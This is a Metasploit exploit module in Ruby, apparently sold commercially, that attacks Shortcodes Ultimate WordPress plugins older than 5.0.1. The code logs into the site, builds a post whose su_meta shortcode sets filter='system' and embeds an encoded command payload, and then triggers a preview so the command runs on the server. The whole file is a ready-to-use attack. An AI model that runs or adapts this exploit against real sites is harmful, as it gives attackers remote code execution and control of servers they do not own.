##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Wordpress Shortcodes Ultimate RCE',
      'Description' => %q{
    This module exploits an authenticated vulnerability in certain versions of the Shortcodes Ultimate Wordpress plugin.

    Wordpress Shortcodes Ultimate plugin < 5.0.1 was vulnerable to an authenticated
    remote command execution vulnerability. Users with the ability to preview a post
    with a special shortcode can execute commands on the underlying operating system.

    Categories: Open Source, Wordpress

    Price: 9

    Video: https://asciinema.org/a/HnwTtUfZEh9IICcm2pdtzYnKL

    OS: Linux

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['unix'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%'",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 7 2017'))

    register_options(
      [
         OptString.new('TARGETURI', [ true, "Base Wordpress directory path", '/wordpress/']),
         OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def exploit
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/wp-login.php'),
      'vars_post' => {
        'log' => datastore['USERNAME'],
        'pwd' => datastore['PASSWORD']
      }
    })

    unless res.code == 302 && res.headers['Location'] =~ /wp-admin/
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-admin/post-new.php'),
      'cookie' => cookie
    })
    parms = ['_wpnonce', '_wp_http_referer', 'user_ID', 'action',
             'originalaction', 'post_author', 'post_type', 'original_post_status',
             'referredby', '_wp_original_http_referer', 'auto_draft', 'post_ID',
             'meta-box-order-nonce', 'closedpostboxesnonce', 'post_title',
             'samplepermalinknonce', 'content', 'wp-preview', 'hidden_post_status',
             'post_status', 'hidden_post_password', 'hidden_post_visibility',
             'visibility', 'post_password', 'mm', 'jj', 'aa', 'hh', 'mn', 'ss',
             'hidden_mm', 'cur_mm', 'hidden_jj', 'cur_jj', 'hidden_aa', 'cur_aa',
             'hidden_hh', 'cur_hh', 'hidden_mn', 'cur_mn', 'original_publish',
             'post_format', 'post_category[]', 'newcategory', 'newcategory_parent',
             '_ajax_nonce-add-category', 'tax_input[post_tag]', 'newtag[post_tag]',
             '_thumbnail_id', 'excerpt', 'trackback_url', 'metakeyinput', 'metavalue',
             '_ajax_nonce-add-meta', 'advanced_view', 'comment_status', 'ping_status',
             'post_name', 'post_author_override']

    post_parms = {}

    parms.each do|parm|
      if parm == "content"
        post_parms['content'] = "[su_meta key=1 post_id=1 default='#{payload.encoded}' filter='system']"
      elsif parm == "newcategory"
        post_parms['newcategory'] = 'New Category Name'
      else
        post_parms[parm] = ''
        unless parm =~ /\[/
          post_parms[parm] = $1 if res.body =~ /name=['"]#{parm}['"] value=['"](.*?)['"] \/>/
        end
      end
    end

    post_parms['wp-preview'] = 'dopreview'

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post.php'),
      'cookie' => cookie,
      'vars_post' => post_parms
    })

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php?' + res.headers['Location'].split('?')[1]),
      'cookie' => cookie
    })

  end
end
